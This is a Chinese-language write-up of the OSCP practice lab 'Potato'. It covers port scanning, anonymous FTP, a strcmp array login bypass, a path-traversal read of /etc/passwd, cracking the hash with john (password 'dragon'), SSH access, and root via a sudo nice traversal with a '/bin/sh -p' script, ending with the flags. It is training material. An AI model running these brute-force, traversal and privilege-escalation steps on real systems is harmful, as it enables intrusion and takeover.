# OSCP系列靶场-Esay-Potato

## 总结

`getwebshell`: `ftp`读取登录处源码 → 绕过登录限制 → 发现文件读取 → 读取用户加密密码 → `john`爆破密码 →
`ssh`账号密码登录

`提 权 思 路`: `sudo`文件发现 → `nice`目录穿越提权

## 准备工作

  * 启动VPN  
获取攻击机IP → `192.168.45.194`

![](https://image.3001.net/images/20230813/1691920869_64d8a9e557a7f87805e5e.png!small)

  * 启动靶机  
获取目标机器IP → `192.168.203.101`

![](https://image.3001.net/images/20230813/1691920870_64d8a9e63d792a1abff12.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次(多次扫描减少误扫)

    
    
    sudo nmap --min-rate 10000 -p- 192.168.203.101
    
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    2112/tcp open  kip
    
    

![](https://image.3001.net/images/20230813/1691920871_64d8a9e704c9e9f6bc7db.png!small)  
`开放的端口-→22,80,2112`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p22,80,2112 192.168.203.101
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
    80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
    2112/tcp open  ftp     ProFTPD
    
    

![](https://image.3001.net/images/20230813/1691920871_64d8a9e7d9f6dd7a91fe7.png!small)

## 信息收集-端口测试

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用

通过`Nmap`探测获得SSH的版本信息，可以尝试利用  
探测版本为`OpenSSH 8.2p1`

    
    
    # 搜索对应脚本
    msf6 → searchsploit OpenSSH 8.2p1
    

无

![](https://image.3001.net/images/20230813/1691920872_64d8a9e8be26b2504c44c.png!small)

#### 22-SSH协议支持的登录方式

通过`Nmap`探测获得SSH的版本信息，在获取到某个用户名之后尝试

    
    
    sudo ssh root @192.168.203.101 -v
    

显示`publickey`、`password`就是支持密钥以及密码登录

![](https://image.3001.net/images/20230813/1691920873_64d8a9e986914e79dc0c7.png!small)

#### 22-SSH手动登录尝试(无)

因为支持密码登录，尝试`root`账户的密码弱密码尝试

    
    
    sudo ssh root @192.168.203.101 -p 22
    # 密码尝试
    password → root
    

弱密码尝试失败

![](https://image.3001.net/images/20230813/1691920874_64d8a9ea53e85f43967dd.png!small)

#### 22-SSH弱口令爆破(静静等待)

因为支持密码登录，尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

    
    
    sudo hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.203.101 ssh -s 22
    

挂着工具进行爆破，我们尝试后续信息收集

![](https://image.3001.net/images/20230813/1691920875_64d8a9eb491baa078352b.png!small)

### 2112-FTP端口的信息收集

这边ftp端口改到了`2112`

#### 2112-FTP版本版本信息

通过`nmap`探测获得`FTP`的版本信息，可以大致推测FTP的配置文件位置  
`namp`探测版本为`ProFTPD`

    
    
    # ProFTPD是开源软件，一般文件位置如下
    /etc/proftpd/proftpd.conf
    

#### 2112-FTP端口匿名登录测试

尝试匿名账号`anonymous`以及无密码进行登录测试

    
    
    # 利用ftp协议+ip进行连接测试
    ftp 192.168.203.101 -p 2112
    Name: anonymous
    

![](https://image.3001.net/images/20230813/1691920877_64d8a9ed2035767cf7dae.png!small)

#### 2112-FTP端口-文件GET收集

登录FTP之后利用`ls`查看存在哪些目录，翻阅的同时查看一下文件权限  
利用`GET`下载文件

    
    
    # binary 以二进制模式传输文件，保证文件完整
    ftp → binary
    # 查看目录结构
    ftp → ls -al
    # get 下载文件
    ftp → get welcome.msg
    ftp → get index.php.bak
    

![](https://image.3001.net/images/20230813/1691920878_64d8a9ee1da392528f080.png!small)

#### 2112-FTP端口-PUT上传测试(不允许)

测试是否可以利用`PUT`上传文件

    
    
    # 建立一个text.txt的文件测试是否能上传
    touch text.txt
    # put 上传文件
    ftp → put text.txt
    

![](https://image.3001.net/images/20230813/1691920879_64d8a9ef5a679479c05db.png!small)

#### 文件查看

`welcome.msg`里面没什么信息

![](https://image.3001.net/images/20230813/1691920880_64d8a9f01ddd15d5f8847.png!small)  
`index.php.bak`文件像是源码信息，表述的是`login`登录

![](https://image.3001.net/images/20230813/1691920880_64d8a9f0dd200963efacf.png!small)

### 80-HTTP端口的信息收集

访问 `http://192.168.203.101:80`不是`CMS`我们直接从`HTML`隐藏信息收集开始

![](https://image.3001.net/images/20230813/1691920881_64d8a9f1cb7cc08dc07d8.png!small)

#### 信息收集-HTML隐藏信息查看

    
    
    # 包括文章中是否写明一些敏感信息
    # curl http://192.168.203.101:80
    
    Potato company
    
      <h1>Potato company</h1>
      <p>At the moment, there is nothing. This site is under construction. To make you wait, here is a photo of a potato:</p>
      <img src="potato.jpg">
    
    
    

`Potato company`可能是关键词

![](https://image.3001.net/images/20230813/1691920882_64d8a9f2a810a1dbfd326.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://192.168.203.101:80 -x 302,403
    

![](https://image.3001.net/images/20230813/1691920883_64d8a9f3884fa99c52339.png!small)  
因为扫出了目录，深层次的扫描待选

    
    
    信息收集-目录扫描(后缀)
    信息收集-目录扫描(深度/大字典)
    信息收集-目录扫描(深度/大字典后缀)
    

#### 信息收集-目录访问

##### /admin/端点

访问该端点是一处很简陋的账号登陆

![](https://image.3001.net/images/20230813/1691920884_64d8a9f4632037962ff6f.png!small)

##### /admin/logs/端点

![](https://image.3001.net/images/20230813/1691920885_64d8a9f51ac0bb553903f.png!small)  
戳进`logs`可以看到用户名是`admin`，其他没什么内容

![](https://image.3001.net/images/20230813/1691920885_64d8a9f5e87e0dc8f1591.png!small)

## 漏洞利用-getwebshell

### 登录处实践

发现存在登录端点时尝试的最佳实践指南

  1. 通用弱账号以及密码尝试登陆

  2. 万能密码实践  
浅浅尝试了`admin``admin`没用 唔

![](https://image.3001.net/images/20230813/1691920886_64d8a9f69b8ba2a74ea2d.png!small)  
想到了之前从`ftp`中获得的源码，可能有一定的关联  
在代码中账号是接受`POST`传参的`username`，值必须是`admin`，正好和`logs`中得到的用户名信息对应上

    
    
    if($_GET['login']==="1"){
      if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {                                                     
        echo "Welcome! </br> Go to the <a href="dashboard.php">dashboard</a>";
        setcookie('pass', $pass, time() + 365*24*3600);                     
      }else{
        echo "<p>Bad login/password! </br> Return to the <a href="index.php">login page</a> <p>";
      }                                                                     
      exit();            
    }       
    

在登录的代码用了`strcmp`进行对比，如果相同返回0不相同返回非0  
只要我们输入的密码和预设的`$pass`相同就可以成功登录

![](https://image.3001.net/images/20230813/1691920887_64d8a9f773e68f67f7dae.png!small)  
网上冲浪得到的结果尝试将密码变为数组输入为1个数引发爆破  
确定是`POST`传参之后，利用`burp`尝试构造

![](https://image.3001.net/images/20230813/1691920888_64d8a9f8a79f2fb0c5939.png!small)  
点击按钮前往新功能

![](https://image.3001.net/images/20230813/1691920889_64d8a9f9d3f83e3988521.png!small)  
发现只有`logs`可以点

![](https://image.3001.net/images/20230813/1691920890_64d8a9fa8eaccfd1d319d.png!small)

### 文件读取获取加密密码

发现功能点存在文件读取的功能

![](https://image.3001.net/images/20230813/1691920891_64d8a9fb63dca801fc8c3.png!small)  
尝试是否可以构造成目录穿越，通过观察`url`以及查看传参抓包确认修改`POST`

![](https://image.3001.net/images/20230813/1691920892_64d8a9fc62223ebf79362.png!small)  
后缀添加尝试失败`file=log_01.txt/../../../../../etc/passwd`

![](https://image.3001.net/images/20230813/1691920893_64d8a9fd8f8ef0ebc9f9e.png!small)  
去掉了`log`发现成功文件读取  
得到用户名与密码`webadmin`:`$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/`

![](https://image.3001.net/images/20230813/1691920894_64d8a9fe8c9813edd8e0c.png!small)  
通常来说`/etc/passwd`文件之中密码是`x`，读到了完整的密码不简单

### 离线爆破密码解密

首先将密码保存成文本，尝试爆破

    
    
    echo '$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/' → pass.hash
    

利用`john`爆破获取密码

    
    
    john pass.hash
    

得到密码为`dragon`

![](https://image.3001.net/images/20230813/1691920895_64d8a9ffe17d06be6f429.png!small)

### 22-SSH账号密码登录

获取账号密码之后利用SSH进行登录

    
    
    sudo ssh webadmin @192.168.203.101 -p22
    password → dragon
    

![](https://image.3001.net/images/20230813/1691920897_64d8aa0133473365d7fe0.png!small)

## 内网遨游-getshell

### FLAG1获取

    
    
    webadmin @serv:~$ find / -name local.txt 2→/dev/null
    /home/webadmin/local.txt
    webadmin @serv:~$ cat /home/webadmin/local.txt
    9374543a8c1147e45e8799cc8f4732ec
    

### 信息收集-内网基础信息收集

提权的本质在于`枚举`，在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

#### 检测Linux操作系统的发行版本

较老的`Ubuntu`以及Linux系统可以`overlayfs`提权

    
    
    # 确定发行版本
    webadmin @serv:~$ lsb_release -a
    No LSB modules are available.
    Distributor ID: Ubuntu
    Description:    Ubuntu 20.04 LTS
    Release:        20.04
    Codename:       focal
    

发行版本为`Ubuntu 20.04`，不太能`overlayfs`提权

#### 检测Linux操作系统的内核版本

较低的内核版本可以进行`脏牛`提权

    
    
    webadmin @serv:~$ uname -a
    Linux serv 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
    

内核版本为`5.4.0-42`

#### 检测当前用户的权限

    
    
    webadmin @serv:~$ id
    uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)
    

#### 列举出所有的sudo文件

查找具有`sudo`权限，且不需要密码的可提权文件  
如果发现`sudo -l`有东西的话 访问 `https://gtfobins.github.io`寻找

    
    
    # 利用sudo -l寻找
    webadmin @serv:~$ sudo -l
    [sudo] password for webadmin: 
    Matching Defaults entries for webadmin on serv:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User webadmin may run the following commands on serv:
        (ALL : ALL) /bin/nice /notes/*
    

发现需要密码，输入`dragon`发现内容

![](https://image.3001.net/images/20230813/1691920898_64d8aa02908bcfea2d2c0.png!small)

### 权限提升

### sudo提权

    
    
    (ALL : ALL) /bin/nice /notes/*
    

发现的内容说明在`/notes/`文件下任意内容都可以`sudo`执行`nice`

![](https://image.3001.net/images/20230813/1691920899_64d8aa0358be08b52d1a2.png!small)  
尝试在该文件夹下写入一个切换容器的命令并执行

    
    
    webadmin @serv:/notes$ echo '/bin/sh -p' → /notes/shell
    -bash: /notes/shell.sh: Permission denied
    

发现该目录下没有权限，换了一个思路  
找到可以执行的目录写入

    
    
    cd /tmp
    echo '/bin/sh -p' → shell
    cat shell
    chmod +x shell
    

尝试利用目录穿越绕过`sudo`的限制

    
    
    webadmin @serv:/tmp$ /bin/nice /notes/../../tmp/shell
    $ id
    uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)
    $ 
    

提权没有成功，思考问题

![](https://image.3001.net/images/20230813/1691920900_64d8aa040757df031a505.png!small)  
忘了加`sudo`，傻了

    
    
    webadmin @serv:/tmp$ sudo /bin/nice /notes/../../tmp/shell
    [sudo] password for webadmin: 
    # id
    uid=0(root) gid=0(root) groups=0(root)
    # 
    

权限提升成功

![](https://image.3001.net/images/20230813/1691920900_64d8aa04e57e7e704d454.png!small)

### FLAG2获取

    
    
    # cat /root/proof.txt
    6d57642f1ea9a70324050997c3b2aa7e
    

完结撒花~

![](https://image.3001.net/images/20230813/1691920901_64d8aa05a727d4b3ade9a.png!small)

## 总结

权限提升的时候忘记加`sudo`有点离谱

